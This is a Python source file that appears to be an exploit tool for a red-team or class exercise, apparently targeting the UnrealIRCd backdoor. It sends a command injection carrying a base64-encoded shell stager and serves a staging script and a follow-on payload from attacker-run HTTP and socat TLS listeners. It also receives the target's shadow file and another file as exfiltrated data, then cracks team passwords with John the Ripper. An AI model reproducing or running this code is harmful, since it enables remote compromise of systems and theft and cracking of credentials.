import base64
import sys
import socket
import http.server
import socketserver
from multiprocessing import Process
import subprocess
from anColor import anColor as colors
import re
import time

# colors, cause...ya know...we're cool and stuff
c = colors()
good = "[" + c.cyan + "+" + c.endc + "] "
blue = "[" + c.blue + "+" + c.endc + "] "
green = "[" + c.green + "+" + c.endc + "] "
warn = "[" + c.warn + "!" + c.endc + "] "
fail = "[" + c.fail + "-" + c.endc + "] "

class unreal:

    def __init__(self):
        pass

    # create socket
    def sock(self, target, port):
        print(good + "Creating socket to target...")
        try:
            s = socket.socket()
            s.connect((target, port))
            s.recv(1024)
            print(good + "Connection successful!")
        except socket.error as error:
            print(fail + "Connection failed...")
            print(error)
            sys.exit(1)

    def initCat(self, deliveryMan):
        encDMan = base64.b64encode(deliveryMan + b' chmod +x /tmp/delivery ; sh /tmp/delivery').decode()
        return 'echo ' + encDMan + ' | base64 -d | /bin/sh'

    # start http listener for staging script pickup
    def httpServ(self, servPort):
        print(good + "Starting HTTP listener...")
        try:
            #httpServ(servPort)
            PORT = int(servPort)
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("", PORT), handler) as httpd:
                print(good + "HTTP server started!")
                print(good + "Waiting for target to pickup staging script...")
                httpd.handle_request()
                print(green + "Staging script retrieved by target!")
        except:
            print(fail + "Failed to start HTTP server.")
            print(warn + "Exiting")
            sys.exit(1)

    # fix up our delivery script with address info and such
    def plugVals(self, server, servip, servport):
        with open("deliveryMan.sh", 'r') as f:
            currentScript = f.read()
            fixedScript = currentScript.replace('<server>', server)
            fixedScript = fixedScript.replace('<payload>', 'sl9kfj93mslf893jfjsa9')
            fixedScript = fixedScript.replace('<follow-on_payload>', 'pwnMe.sh')
            fixedScript = fixedScript.replace('<callback_ip>', servip + ':9091')
        with open("pwnMeTemplate.sh", 'r') as f:
            currentPwn = f.read()
            fixPwn = currentPwn.replace('<server>', servip)
        with open("deliveryManfixed.sh", 'w') as f:
            f.write(fixedScript)
        with open("pwnMe.sh", 'w') as f:
            f.write(fixPwn)

    # send exploit
    def sendSploit(self, deliveryScript, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.recv(1024)
            s.sendall(('AB; ' + deliveryScript + '\n').encode())
            s.close()
            print(good + 'Exploit sent successfully!')
        except socket.error as error:
            print(fail + "Connection made, but failed to send exploit...")
            print(error)
            sys.exit(1)

    # start socat listener and send payload
    def socatListen(self):
        print(good + "Setting up for encrypted payload delivery...")
        try:
            print(good + "Starting encrypted listeners...")
            subprocess.call(["socat", "-u", 'FILE:./pwnMe.sh', 'OPENSSL-LISTEN:9091,method=TLS1.0,cert=test.pem,verify=0,reuseaddr'])
            print(green + "Payload picked up by target!")
            subprocess.call(["socat", "-u", 'OPENSSL-LISTEN:9092,method=TLS1.0,cert=test.pem,verify=0,reuseaddr', 'OPEN:shadow,creat,trunc'])
            subprocess.call(["socat", "-u", 'OPENSSL-LISTEN:9093,method=TLS1.0,cert=test.pem,verify=0,reuseaddr', 'OPEN:mypass.txt,creat,trunc'])
            print(green + "Files successfully exfiltrated!")
        except:
            print(fail + "Encrypted listener failed.")
            print(warn +  "Exiting")
            sys.exit(1)

    # decode the student file and crack passwords from shadow
    def postProcess(self):
        print('\n' + c.blue + '=' * 45 + c.endc)
        print(c.cyan + "Beginning post processing of exfilled data..." + c.endc)
        print(c.blue + '=' * 45 + c.endc + "\n")
        print(good + "Decoding file \"mypass.txt\"...")
        with open("mypass.txt", 'r') as mypass:
            b64mypass = mypass.read()
            mypassDec = base64.b64decode(b64mypass)
            print (green + f"File \"mypass.txt\" decoded as: {mypassDec}")
        print(good + "Attempting to crack team2 passwords in provided shadow file...")
        team = []
        with open("shadow", 'r') as f:
            for i in f:
                if re.search("redteam2", i):
                    team.append(i.strip())
        with open("redteam2", 'w') as redteam:
            for i in team:
                redteam.write(i + "\n")
        my_cmd = ['john', 'redteam2']
        my_cmd2 = ['john', '--show', 'redteam2']
        with open("shadowOut.txt", 'w') as outfile:
                subprocess.run(my_cmd)
                subprocess.run(my_cmd2, stdout=outfile)
        with open("shadowOut.txt", 'r') as outfile:
                cracked = outfile.read()
                print(cracked)
    
        print(green + "Successfully cracked passwords! Results saved in ./shadowOut.txt\n")
        print('\n' + c.blue + '=' * 64 + c.endc + '\n')